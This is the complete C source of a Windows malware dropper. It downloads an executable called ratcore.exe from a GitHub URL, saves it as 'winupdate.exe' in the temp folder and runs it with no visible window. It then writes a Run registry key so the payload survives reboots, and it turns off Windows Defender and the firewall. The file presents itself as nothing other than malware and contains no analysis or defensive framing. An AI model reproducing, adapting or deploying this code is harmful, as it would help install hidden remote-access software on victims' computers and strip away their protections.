#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    char url[] = "https://raw.githubusercontent.com/helloworldgabby/poldiscmalwe/main/ratcore.exe";
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat(path, "winupdate.exe");
    
    // Download
    HINTERNET net = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET conn = InternetOpenUrlA(net, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (conn) {
        HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD bytes;
        char buf[8192];
        while (InternetReadFile(conn, buf, sizeof(buf), &bytes) && bytes > 0) {
            DWORD written;
            WriteFile(f, buf, bytes, &written, NULL);
        }
        CloseHandle(f);
        InternetCloseHandle(conn);
    }
    InternetCloseHandle(net);
    
    // Execute
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, path, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // Persistence
    HKEY key;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
    RegSetValueExA(key, "WinUpdate", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(key);
    
    // Disable AV
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
    system("sc config WinDefend start= disabled");
    system("sc stop WinDefend");
    system("netsh advfirewall set allprofiles state off");
    
    return 0;
}
